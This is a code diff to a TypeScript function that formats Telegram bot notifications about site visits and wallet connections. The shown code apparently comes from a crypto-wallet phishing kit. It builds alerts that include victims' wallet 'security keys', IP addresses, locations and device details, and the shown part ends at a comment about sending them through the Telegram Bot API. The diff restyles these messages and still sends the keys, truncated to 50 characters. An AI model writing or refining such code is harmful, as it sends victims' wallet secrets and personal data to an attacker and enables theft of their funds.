@@ -61,21 +61,25 @@ export async function sendTelegramNotification(activity: UserActivity) {
     if (activity.type === "visit") {
       // Format: Platform visit notification with user details
       message =
-        `🌐 <b>New Platform Visit</b>\n\n` +
-        `⏰ Time: ${new Date(activity.timestamp).toLocaleString()}\n` +
-        `🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
-        `📱 Device: ${activity.userAgent}\n` +
-        `🔗 IP: ${activity.location?.ip || "Hidden"}`
+        `🌐 <b>👁️ NEW PLATFORM VISIT</b>\n\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `⏰ <b>Time:</b> ${new Date(activity.timestamp).toLocaleString()}\n` +
+        `🌍 <b>Location:</b> ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
+        `🔗 <b>IP Address:</b> <code>${activity.location?.ip || "Hidden"}</code>\n` +
+        `📱 <b>Device:</b> <code>${activity.userAgent.substring(0, 50)}...</code>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━`
     } else if (activity.type === "wallet_connect") {
       message =
-        `💰 <b>Wallet Connected</b>\n\n` +
-        `⏰ Time: ${new Date(activity.timestamp).toLocaleString()}\n` +
-        `👛 Wallet: ${activity.walletType}\n` +
-        `🔐 Security Keys: ${activity.securityKeysProvided ? "✅ Provided" : "❌ Not provided"}\n` +
-        `📝 Keys: ${activity.securityKeys ? activity.securityKeys : "Not provided"}\n` +
-        `🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
-        `📱 Device: ${activity.userAgent}\n` +
-        `🔗 IP: ${activity.location?.ip || "Hidden"}`
+        `💰 <b>🔔 WALLET CONNECTED</b>\n\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `⏰ <b>Time:</b> ${new Date(activity.timestamp).toLocaleString()}\n` +
+        `👛 <b>Wallet Type:</b> <code>${activity.walletType}</code>\n` +
+        `🔐 <b>Security Keys:</b> ${activity.securityKeysProvided ? "✅ <b>PROVIDED</b>" : "❌ <b>NOT PROVIDED</b>"}\n` +
+        (activity.securityKeys ? `📝 <b>Keys:</b> <code>${activity.securityKeys.substring(0, 50)}${activity.securityKeys.length > 50 ? "..." : ""}</code>\n` : "") +
+        `🌍 <b>Location:</b> ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n` +
+        `🔗 <b>IP Address:</b> <code>${activity.location?.ip || "Hidden"}</code>\n` +
+        `📱 <b>Device:</b> <code>${activity.userAgent.substring(0, 40)}...</code>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━`
     }
 
     // Send message to Telegram using Bot API
